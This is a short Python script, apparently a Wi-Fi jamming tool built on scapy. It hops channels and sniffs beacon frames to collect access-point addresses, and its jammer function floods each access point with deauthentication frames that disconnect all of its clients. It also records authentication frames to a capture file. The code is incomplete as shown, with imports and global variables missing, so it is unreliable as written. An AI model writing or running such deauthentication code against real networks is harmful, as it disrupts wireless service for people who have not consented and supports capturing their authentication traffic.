#!/bin/python3
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.utils import PcapWriter
from scapy.sendrecv import sniff
from subprocess import Popen
from time import sleep

def verboseOutput(status, output, *details):
		return None

def changeChannel(iface, channel):
	verboseOutput(1, f'Setting {iface} to channel to {channel}')
	command = ['iwconfig ', iface, 'channel', str(channel)]
	Popen(command, shell=False)

def channelHop(iface, channels):
	for channel in channels:
		changeChannel(iface, channel)
		sleep(0.1)

def jammer():
	if len(AP_list) != 0:
		for AP in AP_list:
			verboseOutput(1, f'De-Authenticating All Clients on AP {AP}')
			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
			sendp(DeAuth_Frame)

def packetHandler(packet):
	if packet.haslayer(Dot11):
		if packet.addr2 not in ignore_AP:
			if packet.type == 0:
				verboseOutput(1, f'Found Management Frame')
				if packet.subtype == 8:
					verboseOutput(1, f'Found Beacon Frame')
					if packet.addr2 not in AP_list:
						AP_list.append(packet.addr2)
						verboseOutput(1, f'Access Point Found: {packet.addr2}')
				elif packet.subtype == 11:
					verboseOutput(1, f'Found Authentication Frame')
					if output:
						output.write(packet)
						verboseOutput(1, f'Authentication Frame Found for AP {packet.addr2}')